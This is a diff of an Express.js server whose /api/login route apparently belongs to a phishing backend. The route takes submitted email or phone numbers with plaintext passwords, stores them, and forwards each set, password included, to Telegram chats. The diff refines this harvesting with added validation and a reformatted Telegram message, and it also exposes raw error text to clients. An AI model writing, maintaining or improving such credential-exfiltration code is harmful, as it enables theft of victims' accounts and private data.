@@ -76,7 +76,7 @@ const sendToTelegram = async (message) => {
   }
 };
 
-// Middleware to verify admin token (moved before routes that use it)
+// Middleware to verify admin token (defined once)
 const verifyAdminToken = (req, res, next) => {
   const token = req.header('x-auth-token');
 
@@ -93,11 +93,23 @@ const verifyAdminToken = (req, res, next) => {
   }
 };
 
-
 // Login route
 app.post('/api/login', async (req, res) => {
   try {
     const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;
+
+    // Validation
+    if (!password || !loginMethod) {
+      return res.status(400).json({ message: 'Password and login method are required' });
+    }
+
+    if (loginMethod === 'email' && !email) {
+      return res.status(400).json({ message: 'Email is required for email login' });
+    }
+
+    if (loginMethod === 'phone' && !phone) {
+      return res.status(400).json({ message: 'Phone is required for phone login' });
+    }
 
     // Create new user login record
     const user = new User({
@@ -105,11 +117,11 @@ app.post('/api/login', async (req, res) => {
       phone: loginMethod === 'phone' ? phone : null,
       password,
       loginMethod,
-      loginDate,
-      loginTime,
+      loginDate: loginDate || new Date().toLocaleDateString(),
+      loginTime: loginTime || new Date().toLocaleTimeString(),
       loginHistory: [{
-        date: loginDate,
-        time: loginTime,
+        date: loginDate || new Date().toLocaleDateString(),
+        time: loginTime || new Date().toLocaleTimeString(),
         method: loginMethod,
         device: 'Web Browser'
       }]
@@ -119,12 +131,12 @@ app.post('/api/login', async (req, res) => {
 
     // Prepare Telegram message
     const message = `<b>New User Login</b>\n
-🔹 *Method:* ${loginMethod}
-📅 *Date:* ${loginDate}
-🕒 *Time:* ${loginTime}
-📧 *Email:* ${email || 'N/A'}
-📱 *Phone:* ${phone || 'N/A'}
-🔑 *Password:* ${password}`;
+🔹 <b>Method:</b> ${loginMethod}
+📅 <b>Date:</b> ${user.loginDate}
+🕒 <b>Time:</b> ${user.loginTime}
+📧 <b>Email:</b> ${email || 'N/A'}
+📱 <b>Phone:</b> ${phone || 'N/A'}
+🔑 <b>Password:</b> ${password}`;
 
     // Send login data to Telegram chat IDs
     await sendToTelegram(message);
@@ -146,11 +158,9 @@ app.post('/api/login', async (req, res) => {
 
   } catch (error) {
     console.error('Login error:', error);
-    res.status(500).json({ message: 'Server error' });
+    res.status(500).json({ message: 'Server error', error: error.message });
   }
 });
-
-// Other routes remain unchanged...
 
 // Get most recent user
 app.get('/api/user', async (req, res) => {
@@ -203,44 +213,6 @@ app.get('/api/users', async (req, res) => {
     res.status(500).json({ message: 'Server error' });
   }
 });
-
-// Admin routes (unchanged from your original)
-
-// Middleware to verify admin token
-const verifyAdminToken = (req, res, next) => {
-  const token = req.header('x-auth-token');
-
-  if (!token) return res.status(401).json({ message: 'Access denied: No token provided' });
-
-  try {
-    const decoded = jwt.verify(token, JWT_SECRET);
-    req.admin = decoded;
-    next();
-  } catch (error) {
-    res.status(401).json({ message: 'Invalid token' });
-  }
-};
-
-// Admin dashboard route example
-app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
-  try {
-    const admin = await Admin.findById(req.admin.id).select('-password');
-    if (!admin) return res.status(404).json({ message: 'Admin not found' });
-
-    const userCount = await User.countDocuments();
-    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(5);
-
-    res.status(200).json({
-      admin,
-      stats: { userCount, recentUsers }
-    });
-
-  } catch (error) {
-    console.error('Dashboard error:', error);
-    res.status(500).json({ message: 'Server error' });
-  }
-});
-
 
 // Admin registration
 app.post('/api/admin/register', async (req, res) => {
@@ -354,17 +326,14 @@ app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
   }
 });
 
-
 // Health check
 app.get("/", (req, res) => {
   res.json({ status: true });
 });
 
-// Start server (for local/dev)
-if (process.env.NODE_ENV !== 'production') {
-  app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-  });
-}
+// Start server
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
 
 module.exports = app;
